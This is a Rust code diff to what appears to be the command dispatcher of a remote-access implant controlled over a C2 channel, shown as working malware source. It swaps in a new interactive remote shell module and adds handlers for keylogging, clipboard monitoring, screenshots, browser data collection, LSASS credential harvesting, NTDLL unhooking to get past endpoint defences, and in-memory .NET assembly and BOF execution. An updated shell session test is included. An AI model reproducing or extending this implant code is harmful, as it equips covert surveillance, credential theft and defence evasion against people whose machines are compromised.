@@ -17,9 +17,8 @@ use std::path::Path;
 use std::sync::{Arc, Mutex};
 use sysinfo::System;
 use tokio::sync::Mutex as TokioMutex;
-use uuid::Uuid;
 
-use super::{fsops, shell};
+use super::fsops;
 
 // Pending module-download requests.  When the `DownloadModule` handler
 // sends a `ModuleRequest` through the C2 channel, it inserts a oneshot
@@ -53,8 +52,6 @@ struct PluginJob {
 }
 
 lazy_static! {
-    static ref SHELL_SESSIONS: Mutex<HashMap<String, Arc<Mutex<shell::ShellSession>>>> =
-        Mutex::new(HashMap::new());
     static ref LOADED_PLUGINS: Mutex<HashMap<String, LoadedPlugin>> =
         Mutex::new(HashMap::new());
     pub static ref SHUTDOWN_NOTIFY: Arc<tokio::sync::Notify> = Arc::new(tokio::sync::Notify::new());
@@ -74,20 +71,26 @@ fn sanitize_action(cmd: &Command) -> String {
 
 /// Sanitize the result string before it appears in the audit log.
 ///
-/// Successful `ReadFile`, `ShellOutput`, and `CaptureScreen` results contain
-/// base64-encoded file/shell/screen data.  Logging that verbatim would write
-/// potentially sensitive content to the audit trail (contradicting the claim
-/// in `SECURITY_AUDIT.md §8`).  Replace those payloads with a size summary.
+/// Successful `ReadFile` and `CaptureScreen` results contain base64-encoded
+/// file/screen data.  Logging that verbatim would write potentially sensitive
+/// content to the audit trail (contradicting the claim in
+/// `SECURITY_AUDIT.md §8`).  Replace those payloads with a size summary.
 fn sanitize_result(cmd: &Command, result: &Result<String, String>) -> String {
     match (cmd, result) {
         (Command::ReadFile { .. }, Ok(b64)) => {
             format!("[file content redacted, {} base64 bytes]", b64.len())
         }
-        (Command::ShellOutput { .. }, Ok(b64)) => {
-            format!("[shell output redacted, {} base64 bytes]", b64.len())
-        }
         (Command::CaptureScreen, Ok(b64)) => {
             format!("[screenshot redacted, {} base64 bytes]", b64.len())
+        }
+        (Command::Screenshot { .. }, Ok(msg)) => {
+            msg.clone()
+        }
+        (Command::KeyloggerDump { .. }, Ok(msg)) => {
+            msg.clone()
+        }
+        (Command::ClipboardMonitorDump { .. }, Ok(msg)) => {
+            msg.clone()
         }
         (_, Ok(s)) => s.clone(),
         (_, Err(e)) => e.clone(),
@@ -188,55 +191,6 @@ pub async fn handle_command(
                 Ok(_) => Ok("success".to_string()),
                 Err(e) => Err(e.to_string()),
             }
-        }
-
-        Command::StartShell => {
-            let session_id = Uuid::new_v4().to_string();
-            match shell::ShellSession::new() {
-                Ok(session) => {
-                    SHELL_SESSIONS
-                        .lock()
-                        .unwrap()
-                        .insert(session_id.clone(), Arc::new(Mutex::new(session)));
-                    Ok(session_id)
-                }
-                Err(e) => Err(e.to_string()),
-            }
-        }
-
-        Command::ShellInput {
-            ref session_id,
-            ref data,
-        } => {
-            let sessions = SHELL_SESSIONS.lock().unwrap();
-            if let Some(session) = sessions.get(session_id) {
-                let mut sess = session.lock().unwrap();
-                match sess.write_input(data) {
-                    Ok(_) => Ok(String::new()),
-                    Err(e) => Err(e.to_string()),
-                }
-            } else {
-                Err("Shell session not found".to_string())
-            }
-        }
-
-        Command::ShellOutput { ref session_id } => {
-            let sessions = SHELL_SESSIONS.lock().unwrap();
-            if let Some(session) = sessions.get(session_id) {
-                let mut sess = session.lock().unwrap();
-                let output = sess.try_read_output();
-                Ok(base64::engine::general_purpose::STANDARD.encode(&output))
-            } else {
-                Err("Shell session not found".to_string())
-            }
-        }
-
-        Command::CloseShell { ref session_id } => {
-            let removed = SHELL_SESSIONS.lock().unwrap().remove(session_id);
-            // Dropping the Arc (and thus ShellSession) kills the child process
-            // and frees the PTY file descriptors via ShellSession::drop().
-            drop(removed);
-            Ok("Shell session closed".to_string())
         }
 
         #[cfg(feature = "network-discovery")]
@@ -769,6 +723,247 @@ pub async fn handle_command(
             mesh_guard.set_compartment(compartment.clone());
             Ok(format!("mesh compartment set to '{}'", compartment))
         }
+
+        // ── In-process .NET assembly execution (Windows only) ───────────
+        #[cfg(windows)]
+        Command::ExecuteAssembly { ref data, ref args, timeout_secs } => {
+            match super::assembly_loader::execute(data, args, timeout_secs) {
+                Ok(result) => {
+                    let output_len = result.output.len();
+                    result_data = Some(result.output.into_bytes());
+                    let hr_display = if result.hresult as u32 == 0 {
+                        "S_OK".to_string()
+                    } else {
+                        format!("{:#010X}", result.hresult as u32)
+                    };
+                    Ok(format!(
+                        "assembly executed ({} bytes output, HRESULT={})",
+                        output_len, hr_display
+                    ))
+                }
+                Err(e) => Err(format!("execute-assembly failed: {e}")),
+            }
+        }
+        #[cfg(not(windows))]
+        Command::ExecuteAssembly { .. } => {
+            Err("execute-assembly requires Windows (.NET CLR hosting)".to_string())
+        }
+
+        // ── BOF / COFF loader (Windows only) ────────────────────────────
+        #[cfg(windows)]
+        Command::ExecuteBOF { ref data, ref args, timeout_secs } => {
+            match super::coff_loader::execute_bof(data, args, timeout_secs) {
+                Ok(result) => {
+                    let output_len = result.output.len();
+                    result_data = Some(result.output.into_bytes());
+                    Ok(format!("BOF executed ({} bytes output)", output_len))
+                }
+                Err(e) => Err(format!("execute-bof failed: {e}")),
+            }
+        }
+        #[cfg(not(windows))]
+        Command::ExecuteBOF { .. } => {
+            Err("execute-bof requires Windows (COFF object files)".to_string())
+        }
+
+        // ── Interactive shell sessions ─────────────────────────────────
+        Command::CreateShell { ref shell_path } => {
+            match crate::interactive_shell::create_shell(shell_path.as_deref(), out_tx) {
+                Ok(info) => Ok(serde_json::to_string(&info).unwrap_or_default()),
+                Err(e) => Err(format!("create-shell failed: {e}")),
+            }
+        }
+        Command::ShellInput { session_id, ref data } => {
+            match crate::interactive_shell::send_input(session_id, data) {
+                Ok(()) => Ok(format!("input sent to session {session_id}")),
+                Err(e) => Err(format!("shell-input failed: {e}")),
+            }
+        }
+        Command::ShellClose { session_id } => {
+            match crate::interactive_shell::close_shell(session_id) {
+                Ok(msg) => Ok(msg),
+                Err(e) => Err(format!("shell-close failed: {e}")),
+            }
+        }
+        Command::ShellList => {
+            match crate::interactive_shell::list_shells() {
+                Ok(list) => Ok(serde_json::to_string(&list).unwrap_or_default()),
+                Err(e) => Err(format!("shell-list failed: {e}")),
+            }
+        }
+        Command::ShellResize { session_id, cols, rows } => {
+            match crate::interactive_shell::resize_shell(session_id, cols, rows) {
+                Ok(msg) => Ok(msg),
+                Err(e) => Err(format!("shell-resize failed: {e}")),
+            }
+        }
+
+        // ── Surveillance commands ─────────────────────────────────────
+
+        #[cfg(feature = "surveillance")]
+        Command::Screenshot { monitor } => {
+            let key_bytes = *crypto.key_bytes();
+            match crate::surveillance::capture_screenshot(monitor) {
+                Ok(png_bytes) => {
+                    result_data = Some(png_bytes);
+                    Ok("screenshot captured".to_string())
+                }
+                Err(e) => Err(format!("screenshot failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "surveillance"))]
+        Command::Screenshot { .. } => {
+            Err("surveillance feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "surveillance")]
+        Command::KeyloggerStart => {
+            let key_bytes = *crypto.key_bytes();
+            match crate::surveillance::start_keylogger(key_bytes) {
+                Ok(()) => Ok("keylogger started".to_string()),
+                Err(e) => Err(format!("keylogger start failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "surveillance"))]
+        Command::KeyloggerStart => {
+            Err("surveillance feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "surveillance")]
+        Command::KeyloggerDump { clear } => {
+            let key_bytes = *crypto.key_bytes();
+            match crate::surveillance::dump_keylogger(key_bytes, clear) {
+                Ok(encrypted) => {
+                    result_data = Some(encrypted);
+                    Ok("keylogger buffer dumped".to_string())
+                }
+                Err(e) => Err(format!("keylogger dump failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "surveillance"))]
+        Command::KeyloggerDump { .. } => {
+            Err("surveillance feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "surveillance")]
+        Command::KeyloggerStop => {
+            match crate::surveillance::stop_keylogger() {
+                Ok(()) => Ok("keylogger stopped".to_string()),
+                Err(e) => Err(format!("keylogger stop failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "surveillance"))]
+        Command::KeyloggerStop => {
+            Err("surveillance feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "surveillance")]
+        Command::ClipboardMonitorStart { interval_ms } => {
+            let key_bytes = *crypto.key_bytes();
+            match crate::surveillance::start_clipboard_monitor(key_bytes, interval_ms) {
+                Ok(()) => Ok("clipboard monitor started".to_string()),
+                Err(e) => Err(format!("clipboard monitor start failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "surveillance"))]
+        Command::ClipboardMonitorStart { .. } => {
+            Err("surveillance feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "surveillance")]
+        Command::ClipboardMonitorDump { clear } => {
+            let key_bytes = *crypto.key_bytes();
+            match crate::surveillance::dump_clipboard(key_bytes, clear) {
+                Ok(encrypted) => {
+                    result_data = Some(encrypted);
+                    Ok("clipboard buffer dumped".to_string())
+                }
+                Err(e) => Err(format!("clipboard dump failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "surveillance"))]
+        Command::ClipboardMonitorDump { .. } => {
+            Err("surveillance feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "surveillance")]
+        Command::ClipboardMonitorStop => {
+            match crate::surveillance::stop_clipboard_monitor() {
+                Ok(()) => Ok("clipboard monitor stopped".to_string()),
+                Err(e) => Err(format!("clipboard monitor stop failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "surveillance"))]
+        Command::ClipboardMonitorStop => {
+            Err("surveillance feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "surveillance")]
+        Command::ClipboardGet => {
+            match crate::surveillance::get_clipboard() {
+                Ok(text) => Ok(text),
+                Err(e) => Err(format!("clipboard get failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "surveillance"))]
+        Command::ClipboardGet => {
+            Err("surveillance feature not enabled".to_string())
+        }
+
+        // ── Browser data recovery ─────────────────────────────────────
+
+        #[cfg(all(windows, feature = "browser-data"))]
+        Command::BrowserData { browser, data_type } => {
+            match crate::browser_data::collect_browser_data(browser, data_type) {
+                Ok(json) => {
+                    result_data = Some(json.into_bytes());
+                    Ok("browser data collected".to_string())
+                }
+                Err(e) => Err(format!("browser-data failed: {e}")),
+            }
+        }
+        #[cfg(not(all(windows, feature = "browser-data")))]
+        Command::BrowserData { .. } => {
+            Err("browser-data feature not enabled (Windows only)".to_string())
+        }
+
+        // ── LSASS credential harvesting (Windows only) ──────────────────
+
+        #[cfg(windows)]
+        Command::HarvestLSASS => {
+            match crate::lsass_harvest::harvest_lsass() {
+                Ok(json) => {
+                    result_data = Some(json.into_bytes());
+                    Ok("lsass harvest completed".to_string())
+                }
+                Err(e) => Err(format!("lsass harvest failed: {e}")),
+            }
+        }
+        #[cfg(not(windows))]
+        Command::HarvestLSASS => {
+            Err("LSASS harvesting requires Windows".to_string())
+        }
+
+        // ── NTDLL unhooking (Windows only) ──────────────────────────────
+
+        #[cfg(windows)]
+        Command::UnhookNtdll => {
+            match crate::ntdll_unhook::unhook_ntdll() {
+                Ok(result) => {
+                    let json = serde_json::to_string(&result).unwrap_or_default();
+                    result_data = Some(json.into_bytes());
+                    Ok(format!(
+                        "ntdll unhooked via {} ({} stubs re-resolved)",
+                        result.method, result.stubs_re_resolved,
+                    ))
+                }
+                Err(e) => Err(format!("ntdll unhook failed: {e}")),
+            }
+        }
+        #[cfg(not(windows))]
+        Command::UnhookNtdll => {
+            Err("NTDLL unhooking requires Windows".to_string())
+        }
     };
 
     let (outcome, details) = match &result {
@@ -945,84 +1140,92 @@ mod tests {
         );
     }
 
-    /// AuditEvent.details must NOT contain shell output for a ShellOutput result.
+    /// Interactive shell: create, send input, and close should all work.
+    /// Shell output arrives asynchronously via Message::ShellOutput, so
+    /// we verify the session lifecycle rather than polling for output.
     #[cfg(target_os = "linux")]
     #[tokio::test]
-    async fn shell_io_is_redacted_in_audit() {
-        // Start a shell, send a command, read output.
+    async fn shell_session_lifecycle() {
         let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
         let cfg_arc = Arc::new(TokioMutex::new(Config::default()));
-        let (out_tx, _out_rx) = tokio::sync::mpsc::channel(16);
+        let (out_tx, mut out_rx) = tokio::sync::mpsc::channel(64);
         let p2p_mesh = Arc::new(tokio::sync::Mutex::new(crate::p2p::P2pMesh::default()));
 
-        let (start_res, _, _) = handle_command(
+        // Create a shell session.
+        let (create_res, _, audit) = handle_command(
             crypto.clone(),
             cfg_arc.clone(),
-            Command::StartShell,
+            Command::CreateShell { shell_path: None },
             "admin",
             out_tx.clone(),
             p2p_mesh.clone(),
         )
         .await;
-        let session_id = start_res.expect("StartShell should succeed");
+        let create_str = create_res.expect("CreateShell should succeed");
+        let info: serde_json::Value = serde_json::from_str(&create_str).unwrap();
+        let session_id = info["session_id"].as_u64().unwrap() as u32;
 
-        // Send a command that produces predictable output.
-        handle_command(
+        // Verify audit log does not contain sensitive data.
+        assert!(
+            !audit.details.contains("redacted") || audit.details.contains("session"),
+            "CreateShell audit should reference the session"
+        );
+
+        // Send input.
+        let (input_res, _, _) = handle_command(
             crypto.clone(),
             cfg_arc.clone(),
             Command::ShellInput {
-                session_id: session_id.clone(),
-                data: b"echo ORCHESTRA_TEST_SENTINEL\n".to_vec(),
+                session_id,
+                data: "echo hello\n".to_string(),
             },
             "admin",
             out_tx.clone(),
             p2p_mesh.clone(),
         )
         .await;
+        assert!(input_res.is_ok(), "ShellInput should succeed: {:?}", input_res);
 
-        // Give the shell a moment to produce output.
-        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
+        // Give the reader thread time to capture output.
+        tokio::time::sleep(std::time::Duration::from_millis(200)).await;
 
-        let (out_res, _, audit) = handle_command(
+        // Drain any ShellOutput messages that arrived.
+        while let Ok(msg) = out_rx.try_recv() {
+            // Just verify they're the right type.
+            match msg {
+                Message::ShellOutput { session_id: sid, data, .. } => {
+                    assert_eq!(sid, session_id, "ShellOutput should reference our session");
+                    let _ = data; // don't care about content for lifecycle test
+                }
+                _ => {}
+            }
+        }
+
+        // List shells.
+        let (list_res, _, _) = handle_command(
             crypto.clone(),
             cfg_arc.clone(),
-            Command::ShellOutput {
-                session_id: session_id.clone(),
-            },
+            Command::ShellList,
             "admin",
             out_tx.clone(),
             p2p_mesh.clone(),
         )
         .await;
-        assert!(out_res.is_ok(), "ShellOutput should succeed");
+        let list_str = list_res.expect("ShellList should succeed");
+        let list: Vec<serde_json::Value> = serde_json::from_str(&list_str).unwrap();
+        assert!(list.iter().any(|e| e["session_id"].as_u64().unwrap() as u32 == session_id),
+            "ShellList should include our session");
 
-        // The raw sentinel text must not appear in the audit log.
-        assert!(
-            !audit.details.contains("ORCHESTRA_TEST_SENTINEL"),
-            "audit.details must not contain raw shell output"
-        );
-        // The base64-encoded output must also be absent.
-        if let Ok(ref b64) = out_res {
-            assert!(
-                !audit.details.contains(b64.as_str()),
-                "audit.details must not contain base64 shell output"
-            );
-        }
-        assert!(
-            audit.details.contains("redacted"),
-            "audit.details should contain redaction marker, got: {:?}",
-            audit.details
-        );
-
-        // Clean up.
-        handle_command(
+        // Close the shell.
+        let (close_res, _, _) = handle_command(
             crypto,
             cfg_arc,
-            Command::CloseShell { session_id },
+            Command::ShellClose { session_id },
             "admin",
             out_tx,
             p2p_mesh,
         )
         .await;
+        assert!(close_res.is_ok(), "ShellClose should succeed: {:?}", close_res);
     }
 }
